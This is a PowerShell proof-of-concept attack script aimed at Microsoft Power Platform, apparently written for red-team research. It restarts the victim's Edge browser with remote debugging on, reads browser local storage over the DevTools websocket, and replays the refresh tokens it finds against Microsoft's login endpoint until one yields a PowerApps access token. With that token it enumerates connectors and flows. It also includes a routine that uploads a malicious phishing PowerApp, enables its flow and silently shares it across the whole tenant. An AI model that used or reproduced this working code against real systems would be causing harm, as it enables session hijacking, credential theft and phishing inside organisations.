# Notes:
# This technique (--remote-debugging-port) works on Chromium based browsers + Electron.js apps (e.g.: MS Teams, etc.)
# This script will get a valid PowerApps token from a logged in browser session (msedge) and print to the screen some data retrieved using the PowerApps browser APIs.
# This demonstrates control over the account and any actions performed in the browser can be done on the command line. 


## Functions

function Parse-JWTtoken {
    [cmdletbinding()]
    param([Parameter(Mandatory=$true)][string]$token)
    # SOURCE: https://www.michev.info/Blog/Post/2140/decode-jwt-access-and-id-tokens-via-powershell

    #Validate as per https://tools.ietf.org/html/rfc7519
    #Access and ID tokens are fine, Refresh tokens will not work
    if (!$token.Contains(".") -or !$token.StartsWith("eyJ")) { Write-Error "Invalid token" -ErrorAction Stop }
 
    #Header
    $tokenheader = $token.Split(".")[0].Replace('-', '+').Replace('_', '/')
    while ($tokenheader.Length % 4) { $tokenheader += "=" }
    
    # [System.Text.Encoding]::ASCII.GetString([system.convert]::FromBase64String($tokenheader)) | ConvertFrom-Json | fl | Out-Default
 
    #Payload
    $tokenPayload = $token.Split(".")[1].Replace('-', '+').Replace('_', '/')
    while ($tokenPayload.Length % 4) { $tokenPayload += "=" }
    #Fix padding as needed, keep adding "=" until string length modulus 4 reaches 0
    #Convert to Byte array
    $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
    #Convert to string array
    $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
    #Convert from JSON to PSObject
    $tokobj = $tokenArray | ConvertFrom-Json
    
    return $tokobj
}


function Brute-ValidTokens() {
    Param(
        [Array]$possible_refresh_tokens,
        [string]$client_id,
        [string]$scope,
        [string]$expectedAudience=$null, # if specified, only tokens with audience containing $expectedAudience substring will be returned
        [boolean]$allTokens = $false
    )

    $counter = 0
    $valid_tokens = @()
    foreach ($refresh_token in $possible_refresh_tokens) {
        # $trim_token = $refresh_token
        try {
            # $WellknownClientId = "1950a258-227b-4e31-a9cf-717495945fc2" # "1950a258-227b-4e31-a9cf-717495945fc2"
            # $scope = "https%3A%2F%2Fservice.powerapps.com%2F%2F.default+offline_access+openid+profile"   # from powershell?
            $method = [Microsoft.PowerShell.Commands.WebRequestMethod]::"POST"
            $URI = [System.Uri]::new("https://login.microsoftonline.com:443/organizations/oauth2/v2.0/token")
            $maximumRedirection = [System.Int32] 0
            $headers = [System.Collections.Generic.Dictionary[string,string]]::new()
            $headers.Add("Host", "login.microsoftonline.com")
            $contentType = [System.String]::new("application/x-www-form-urlencoded;charset=utf-8")
            $headers.Add("Origin", "https://make.powerautomate.com")
            $body = [System.String]::new("client_id=$client_id&scope=$scope&grant_type=refresh_token&refresh_token=$refresh_token")
            $resp = $null
            $resp = (Invoke-WebRequest -Method $method -Uri $URI -MaximumRedirection $maximumRedirection -Headers $headers -ContentType $contentType -Body $body)
            $resp = $resp.Content | ConvertFrom-Json

            $obj = [PSCustomObject]@{
                audience=$audience
                clientid=$WellknownClientId
                refresh_token=$refresh_token
                access_token=$resp.access_token
            }

            $jwt_body = Parse-JWTtoken -token $obj.access_token
            if ($expectedAudience -and !$jwt_body.aud.Contains($expectedAudience)) {
                Write-Warning -Message "[!] usable token found, but JWT audience ($($jwt_body.aud)) does not match expectedAudience $($expectedAudience)"
                continue
            }

            $valid_tokens += $obj
            $token_trimmed = $refresh_token.Substring(0, 25) + '...' + $refresh_token.Substring($refresh_token.Length - 25)
            Write-Host "[!] Succeeded on: $audience, $WellknownClientId, $token_trimmed"

            If (!$allTokens) {
                break # break for POC speed, but can continue to gather more creds (potentially more accounts logged in other tabs, etc.)
            }
        } catch {
            write-verbose -Message "ERROR $_"
        }
        
        
        If (++$counter % 5 -eq 0) {
            Write-Host [+] Testing tokens for permissions: $counter / ($possible_refresh_tokens.Count)
        }
    }

    return $valid_tokens
}

function Scan-WebSocket() {
    Param(
        [string]$url,
        [string]$params
    )

    $ws = New-Object System.Net.WebSockets.ClientWebSocket
    $ct = New-Object System.Threading.CancellationToken

    $st = ""
    $size = 2048

    $l = @(); $params.ToCharArray() | % {$l += [byte] $_}          
    $p = New-Object System.ArraySegment[byte]  -ArgumentList @(,$l)
    $l = [byte[]] @(,0) * $size
    $receive = New-Object System.ArraySegment[byte]  -ArgumentList @(,$l)

    Write-Host "`nConnecting to $url"
    $conn = $ws.ConnectAsync($url, $ct)
    While (!$conn.IsCompleted) { Start-Sleep -Milliseconds 100 }
    Write-Host "Connected!"
    $conn = $ws.SendAsync($p, [System.Net.WebSockets.WebSocketMessageType]::Text, [System.Boolean]::TrueString, $ct)
    While (!$Conn.IsCompleted) { Start-Sleep -Milliseconds 100 }

    $counter = 0
    do {
        $conn = $ws.ReceiveAsync($receive, $ct)
        While (!$Conn.IsCompleted) { Start-Sleep -Milliseconds 100 }
        # $receive.Array[0..($conn.Result.Count - 1)] | ForEach { $st += [char]$_ }
        $st += [System.Text.Encoding]::ASCII.GetString($receive)  # SIGNIFICANT PERFORMANCE INCREASE FROM LINE ABOVE
   
        # print status
        If (++$counter % 20 -eq 0) {
            write-host Recieved $st.length Bytes `( End of message: $conn.Result.EndOfMessage `)
        }
     } until ($conn.Result.EndOfMessage) 

    $conn = $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "NormalClosure", $ct) 
    While (!$Conn.IsCompleted) { Start-Sleep -Milliseconds 100 }
    # Write-Host "Output for $site :"
    
    return $st
}

function Get-ValidTokens() {
    Param(
        [PSCustomObject] $chromium_debugging_dump_options,
        [PSCustomObject] $brute_token_options  
    )

    $sites = Invoke-WebRequest -Uri "http://localhost:$($chromium_debugging_dump_options.debug_port)/json" | ConvertFrom-Json
    $sites = $sites | Where-Object { $_.Url -match ($chromium_debugging_dump_options.url_match_arr -join "|") } 
    # $sites | select webSocketDebuggerUrl, url

    foreach ($site in $sites) {
        Write-Host Getting data from: $site.url
        
        # (Optional) Task 1: get cookies

        # Task 2: get storage
        $url = $site.webSocketDebuggerUrl
        $params = '
            {
                "id": 1,
                    "method": "DOMStorage.getDOMStorageItems",
                    "params": {
                        "storageId": {
                            "securityOrigin": "https://SECURITY_ORIGIN_URL",
                            "isLocalStorage": true
                        }
                    }
            }
        '

        $global:tested_tokens = @{}
        # update securityOrigin URL
        $params = $params.Replace("SECURITY_ORIGIN_URL", $site.url.split('/')[2])
        $st = Scan-WebSocket -url $url -params $params 

        # check if any tokens valid
        $m = Select-String -InputObject $st -Pattern $chromium_debugging_dump_options.pattern -AllMatches
        
        $possible_matches = @()
        $possible_matches += $m.Matches.Value | Where-Object { $_.Length -gt 100 -and !$global:tested_tokens[$_]}
        
        if ($possible_matches) {
            foreach ($brute_token_option in $brute_token_options) {
                $tokens = Brute-ValidTokens -possible_refresh_tokens $possible_matches -client_id $brute_token_option.clientId -scope $brute_token_option.scope -expectedAudience $brute_token_option.expectedAudience -allTokens $brute_token_option.allTokens
                If ($tokens) {
                    return $tokens
                }
            }
            $possible_matches |% { $global:tested_tokens[$_] = $true; write-host TESTED TOKEN: ($_.Substring(0, 25) + '...' + $_.Substring($_.Length - 25)) } # populate tested tokens
        }
    }
    return $null
}

##

#### PowerApps + Power Automate: Requires PowerApps OR Power Automate token (code may need to be modified a bit for Flow tokens)

function Get-PowerPlatformConnectors($token, $environment) {
    # gets connectors for Default envrionment - must be modified to enumerate more Power Platform Envrionments
    $headers = @{
        'Authorization' = "Bearer $token"
    }

    $jwt_body = Parse-JWTtoken -token $token
    write-host "[+] Using access_token for (PowerApps): $($jwt_body.upn)"

    write-host "[+] Getting Connector Info"
    $connections = @()
    $url = "https://unitedstates.api.powerapps.com/providers/Microsoft.PowerApps/connections?api-version=2020-06-01&`$filter=environment%20eq%20%27$environment%27"
    do {
        $resp = Invoke-RestMethod -Uri $url -Headers $headers 
        $connections += $resp.value
        $url = $resp.nextLink
    } while ($resp.nextLink)


    
    $connectors_cleaned = @()
    foreach ($connection in $connections) {
        $obj = [PSCustomObject]@{
            created=$connection.properties.createdTime.toString().split('T')[0]
            type=$connection.properties.apiId.Replace('/providers/Microsoft.PowerApps/apis/', '')
            displayName=$connection.properties.displayName
            createdBy="$($connection.properties.createdBy.userPrincipalName) -- ($($connection.properties.createdBy.Id))"
            statuses=$connection.properties.statuses.status -join ","
            allowSharing=$connection.properties.allowSharing
            ConnectionParameterSet=$connection.properties.connectionParametersSet | ConvertTo-Json -Depth 99 -Compress

            url="https://make.powerapps.com/environments/$environment/connections/$($connection.properties.apiId.replace('/providers/Microsoft.PowerApps/apis/', ''))/details"
        }

        $connectors_cleaned += $obj
    }


    ## START TEST
    # get flows
    write-host "[+] Getting Flows"
    $url = "https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/$environment/flows?`$filter=search(%27team%27)&`$top=50&include=includeSolutionCloudFlows&api-version=2016-11-01"
    $resp = $null
    $resp = Invoke-RestMethod -Uri $url -Headers $headers 
    
    $flows = @()
    do {
        $resp = Invoke-RestMethod -Uri $url -Headers $headers 
        $flows += $resp.value
        $url = $resp.nextLink
    } while ($resp.nextLink)
  
    write-host "[+] Evaluating Flows"
    $counter = 0
    $flow_connectors = @()
    foreach ($flow in $flows) {
        $owners_url =  "https://us.api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/$($environment)/flows/$($flow.name)/owners?api-version=2016-11-01"
        $resp_owners = $null
        $resp_owners = Invoke-RestMethod -Uri $owners_url -Headers $headers


        $get_cons_for_flow_url = "https://us.api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/$($environment)/flows/$($flow.name)/connections?api-version=2016-11-01"
        $resp = $null
        $resp = Invoke-RestMethod -Uri $get_cons_for_flow_url -Headers $headers
        
        If ($resp) {
            # add flow_url field
            $resp |% {
                $_ | Add-Member NoteProperty -Name flow_environment -Value $environment -ErrorAction SilentlyContinue
                $_ | Add-Member NoteProperty -Name flow_name -Value $flow.name -ErrorAction SilentlyContinue
                $_ | Add-Member NoteProperty -Name flow_url -Value "https://make.powerautomate.com/environments/$environment/flows/$($flow.name)/details" -ErrorAction SilentlyContinue
                $_ | Add-Member NoteProperty -Name triggers -Value ($flow.properties.definitionSummary.triggers.type -join ', ') -ErrorAction SilentlyContinue  
                $_ | Add-Member NoteProperty -Name num_owners -Value $resp_owners.value.Count -ErrorAction SilentlyContinue  
            }

            $flow_connectors += $resp
        }
        
        If (++$counter % 20 -eq 0) {
            write-host "Evaluated $counter / $($flows.count) Flows"
        }
    }
    
    $flow_connectors_cleaned = @()
    foreach ($connector in $flow_connectors) {
        $obj = [PSCustomObject]@{
            statuses=$connector.properties.statuses.status -join ","
            num_owners=$connector.num_owners
            triggers=$connector.triggers
            created=$connector.properties.createdTime.toString().split('T')[0]
            expirationTime=If ($connector.properties.expirationTime) { $connector.properties.expirationTime.toString().split('T')[0] } else { '' }
            type=$connector.properties.apiId.Replace('/providers/Microsoft.PowerApps/apis/', '')
            authenticatedUser=$connector.properties.authenticatedUser.name
            isDelegatedAuthConnection=$connector.properties.isDelegatedAuthConnection
            displayName=$connector.properties.displayName
            
            flow_url=$connector.flow_url
        }

        $flow_connectors_cleaned += $obj
    }
    # $flow_connectors_cleaned | sort type,statuses,authenticatedUser,id,created -Unique | export-csv connector_dump.csv -NoTypeInformation
    ### END TEST

    # for each flow, add field for which flow it came from + url
    # connectors for specific flow
    # https://us.api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/Default-8e61d5fe-7749-4e76-88ee-6d8799ae8143/flows/8032b6bd-a636-49b4-86de-ef20530e9cb8/connections?api-version=2016-11-01
    # $url = "https://us.api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/Default-8e61d5fe-7749-4e76-88ee-6d8799ae8143/flows/8032b6bd-a636-49b4-86de-ef20530e9cb8/connections?api-version=2016-11-01"
    
    $output = @{
        global_connectors = $connectors_cleaned | sort statuses, type, upn, id, created -Unique
        flow_connectors = $flow_connectors_cleaned | sort type, statuses, authenticatedUser, id, created -Unique
    }

    return $output
}

##### PowerApp Functions: Requires valid PowerApps token
function Import-PowerApp($token, $output_dir, $tenant_id) {
    ############
    # STEP: PowerApps
    ############
    # - need to auth for new token?
    # - upload bad powerapp
    Write-Host "[+] Uploading Malicious PowerApp .zip"

    $headers = @{
        "Authorization"= "Bearer $token"
    }

    # get default PowerApps environmennt
    $resp = Invoke-RestMethod -Method Get -Uri "https://us.api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments?api-version=2016-11-01" -Headers $headers
    $powerPlatform_environment = ($resp.value | where-object { $_.properties.isDefault -eq $true }).name

    # Get connections (cannot make w/o MFA?)
    # $resp = Invoke-RestMethod -Uri "https://unitedstates.api.powerapps.com/providers/Microsoft.PowerApps/connections?api-version=2020-06-01" -Headers $headers
    $resp = Invoke-RestMethod -Uri "https://unitedstates.api.powerapps.com/providers/Microsoft.PowerApps/connections?api-version=2020-06-01&`$filter=environment%20eq%20%27$powerPlatform_environment%27" -Headers $headers
    $SP_conn = $resp.value | where id -like "*shared_office365users*" | select -first 1
    If (!$SP_conn) {
        Write-Warning -Message "No User connector, create new one? Requires MFA?"
        return # terminate / sleep program
    }

    
    # Get Shared Access Signature
    $resp = Invoke-RestMethod -Method Post -Headers $headers -Uri "https://api.bap.microsoft.com/providers/Microsoft.BusinessAppPlatform/environments/$($powerPlatform_environment)/generateResourceStorage?api-version=2016-11-01"
    $SAS = $resp.sharedAccessSignature

    # download
    $malicious_powerapp_zip_filename = "M365Phish-UserConnPowerApp.zip" # can be downloaded from remote server 
    $malicious_powerapp_zip_filepath = "$output_dir\$malicious_powerapp_zip_filename"
    
    # upload
    $upload_uri = $($SAS.split('?')[0] + "/POC_M365Phish_powerapp.zip?" + $SAS.split('?')[1])
    # $resp = Invoke-RestMethod -Method Post -Headers $headers -Uri "https://api.bap.microsoft.com/providers/Microsoft.BusinessAppPlatform/environments/$($new_flow.environment)/generateResourceStorage?api-version=2016-11-01"

    $resp = Invoke-WebRequest -Method Put -Headers @{ 'X-Ms-Blob-Type' = 'BlockBlob' } -Uri $upload_uri -InFile $malicious_powerapp_zip_filepath


    $body = @{
        "packageLink" = @{
            "value"= "$upload_uri"
        }
    }

    $headers['content-type'] = 'application/json'
    $resp = Invoke-WebRequest -Headers $headers -Method Post -Uri "https://api.bap.microsoft.com/providers/Microsoft.BusinessAppPlatform/environments/$powerPlatform_environment/listImportParameters?api-version=2016-11-01"  -Body ($body | ConvertTo-Json -Depth 99)
    $listImportOperationsUrl = $resp.Headers.Location.split('?')[0] | select -first 1
    $null = $listImportOperationsUrl -match "listImportOperations/(.*)"
    $listImportOperationsId = $matches[1]

    # wait for upload success
    do {
        $resp = Invoke-RestMethod -Headers $headers -Uri "$($listImportOperationsUrl)?api-version=2016-02-01"
        If ( $resp.properties.status -ne 'Succeeded') { write-host "Upload not complete, sleeping 2 seconds"; Start-Sleep 2 } 
    } while ($resp.properties.status -ne 'Succeeded')
    write-host "[+] Pausing an extra 5 seconds"
    Start-Sleep 5


    # import
    $resp = Invoke-RestMethod -Headers $headers -Uri "https://api.bap.microsoft.com/providers/Microsoft.BusinessAppPlatform/environments/$powerPlatform_environment/listImportOperations/$listImportOperationsId`?api-version=2016-11-01"

    $resource_guids = $resp.properties.resources.psobject.Properties.Name
    for ($i = 0; $i -lt $resource_guids.Count; $i++) {
        $resource = $resp.properties.resources.($resource_guids[$i])
        $selectedCreationType = if ($i -eq 0) { 'New' } else { If ($resource.suggestedCreationType) {$resource.suggestedCreationType} else { $null } }

        switch ($resource.type) {
            'Microsoft.Flow/flows' {
                $selectedCreationType = "New"
                # $resource | Add-Member NoteProperty -Name Id -Value "/providers/Microsoft.ProcessSimple/environments/$powerPlatform_environment/flows/$($new_flow.flowId)" -ErrorAction SilentlyContinue
                break;
            }
            'Microsoft.PowerApps/apis/connections' {
                $selectedCreationType = "Existing"
                $resource | Add-Member NoteProperty -Name Id -Value $SP_conn.id -ErrorAction SilentlyContinue
                break;
            }
        }

        If ($selectedCreationType) {
            $resource | Add-Member NoteProperty -Name selectedCreationType -Value $selectedCreationType -ErrorAction SilentlyContinue
        }
    }
    
    $powerapp_json = $resp.properties | ConvertTo-Json -Depth 99

    # (optional) validate import package
    # $uri = "https://api.bap.microsoft.com/providers/Microsoft.BusinessAppPlatform/environments/$powerPlatform_environment/importPackage?api-version=2016-11-01"
    # $resp = Invoke-RestMethod -Method Post -Uri $uri -Headers $headers -Body $flow_json

    # import package
    $uri = "https://api.bap.microsoft.com/providers/Microsoft.BusinessAppPlatform/environments/$powerPlatform_environment/importPackage?api-version=2016-11-01"
    $headers['content-type']='application/json'
    $resp = Invoke-WebRequest -Method Post -Uri $uri -Headers $headers -Body $powerapp_json
    $pkgUrl = $resp.Headers.Location | select -first 1

    # NOTE: WILL FAIL HERE IF APP NAME ALREADY EXISTED, MORE LOGIC REQUIRED FOR THIS EDGE CASE

    # check status of import
    $max_waittime_sec = 60*4
    $pause_sec = 3
    $counter = 0
    do {
        $resp = Invoke-RestMethod -Method Get -Uri $pkgUrl -Headers $headers 
        If ($resp.properties.status -ne 'Succeeded') { write-host "Import not complete, sleeping $pause_sec seconds (force continue in $($max_waittime_sec - ($pause_sec * $counter)) sec)"; Start-Sleep $pause_sec } 
        $counter++
    } while ($resp.properties.status -ne "Succeeded" -and ($pause_sec * $counter) -lt $max_waittime_sec)
    write-host Done.

    ($resp | ConvertTo-Json -Depth 99) -match '/providers/Microsoft.PowerApps/apps/(.*?)"'
    $powerapp_id = $matches[1]
    ($resp | ConvertTo-Json -Depth 99) -match '/providers/Microsoft.Flow/flows/(.*?)"'
    $flow_id = $matches[1]

    # enable flow
    $resp = Invoke-RestMethod -Method Post -Uri "https://us.api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/$powerPlatform_environment/flows/$flow_id/start?api-version=2016-11-01" -Headers $headers
 
    # share powerapp w/ Everyone
    $headers_powerapp_share = @{
        'Authorization' = "Bearer $token"
        "Content-Type" = "application/json"
        "X-Ms-Path-Query" = "/providers/Microsoft.PowerApps/apps/$powerapp_id/modifyPermissions?%24filter=environment%20eq%20'$powerPlatform_environment'&api-version=2020-06-01"
    } 
    $body = '
    {
        "put": [
            {
                "properties": {
                    "roleName": "CanView",
                    "principal": {
                        "email": "",
                        "id": null,
                        "type": "Tenant",
                        "tenantId": "' + $tenant_id + '"
                    },
                    "NotifyShareTargetOption": "DoNotNotify"
                }
            }
        ],
        "delete": []
    }
    '
    $resp = Invoke-RestMethod -Method Post -Uri "https://unitedstates.api.powerapps.com/api/invoke" -Headers $headers_powerapp_share -body $body

    $obj = [PSCustomObject]@{
        powerapp_id = $powerapp_id
        flow_id = $flow_id
        flow_url = "https://make.powerautomate.com/environments/$flow_url/flows/$flow_id/details"
        powerapp_details_url = "https://make.powerapps.com/environments/$powerPlatform_environment/apps/$powerapp_id/details"
        powerapp_phish_url = "https://apps.powerapps.com/play/e/$powerPlatform_environment/a/$($powerapp_id)?tenantId=$tenant_id"
    }

    write-host "PowerApp usually takes 5-15min to be ready (minimal testing)."
    return $obj
}

#### ^ END FUNCTIONS ^



##################
#### MAIN 
##################

##### Stage 1: Get PowerApps token + Upload malicious .zip (Technique: Chromium/Electron.js --remote-debugging-port)

$port = 9222

$p = get-process | where name -eq msedge # chrome | teams | msedge | ... | any Chromium based browser or Electron.js app
# $p = get-process | where name -eq chrome
$chrome_path = $p[0].path
$p |% { Stop-Process $_ }

$proc = [System.Diagnostics.Process]::Start($chrome_path,"--restore-last-session --hide-crash-restore-bubble --remote-debugging-port=$port")


# FASTER, TARGET AUTH TO ONE SERVICE
$chromium_debugging_dump_options = [PSCustomObject]@{
    debug_port = $port
    url_match_arr = @('powerautomate', 'powerapps') # "teams") # ".*" to search all
    pattern = "(0\.[a-zA-Z0-9\._\-]+)"
}


$token = $null
$global:tested_tokens = @{}
while ($true) {
    # get PowerApp token, preferred, access to both PowerApps + Flow API
    
    write-host "[+] Trying to find a PowerApps/Power Automate refresh token"
    $brute_token_options = [PSCustomObject]@(
        @{
            clientId = "a8f7a65c-f5ba-4859-b2d6-df772c264e9d"
            scope = "https%3A%2F%2Fservice.powerapps.com%2F%2F.default%20openid%20profile%20offline_access"
            expectedAudience = "service.powerapps.com"
            allTokens = $false
        }

        ## Power Automate ONLY token options
        # ,
        # @{
        #     clientId = "a8f7a65c-f5ba-4859-b2d6-df772c264e9d" # a8f7a65c-f5ba-4859-b2d6-df772c264e9d | 6204c1d1-4712-4c46-a7d9-3ed63d992682
        #     scope = "https%3A%2F%2Fservice.flow.microsoft.com%2F%2F.default%20openid%20profile%20offline_access"
        #     expectedAudience = $null
        #     allTokens = $false
        # },
        # ,
        # @{
        #     clientId = "6204c1d1-4712-4c46-a7d9-3ed63d992682" # a8f7a65c-f5ba-4859-b2d6-df772c264e9d | 6204c1d1-4712-4c46-a7d9-3ed63d992682
        #     scope = "https%3A%2F%2Fservice.flow.microsoft.com%2F%2F.default%20openid%20profile%20offline_access"
        #     expectedAudience = $null
        #     allTokens = $false
        # }
    )

    $tokens = $null
    $tokens = Get-ValidTokens -chromium_debugging_dump_options $chromium_debugging_dump_options -brute_token_options $brute_token_options -AllTokens
    
    If ($tokens) {
        break
    }

    write-host "[!] NO TOKENS FOUND, PAUSING 5 seconds and trying again"
    Start-Sleep 5
}


write-host "FOUND TOKEN(S)"

# Could loop through each valid token (different user sessions across different browsers, etc.)
# foreach ($token in $tokens) { }

$token = $tokens[0].access_token
$jwt_body = Parse-JWTtoken $token 
$jwt_body | fl

$headers = @{
    'Authorization' = "Bearer $token"
}

# get default PowerApps environmennt
$resp = Invoke-RestMethod -Method Get -Uri "https://us.api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments?api-version=2016-11-01" -Headers $headers
$environment = ($resp.value | where-object { $_.properties.isDefault -eq $true }).name

# dump Power Automate 
$connectors = Get-PowerPlatformConnectors -token $token -environment $environment
# $connectors | ft
write-host "[+] Global Connectors"
$connectors.global_connectors | where type -ne "shared_logicflows" | ft

write-host "[+] Shared Flow Connectors"
$connectors.flow_connectors | ft


# # Upload malicious PowerApp
# $output_dir = "."
# $new_app = Import-PowerApp -token $token -output_dir $output_dir -tenant_id $jwt_body.tid
# $new_app | fl


## TO DO
# - Function to dump Flow definitions + look for secrets / keys 
# KEY | APIKEY | SECRET | PASSWORD | TOKEN | JWT | SIGNATURE | .... 



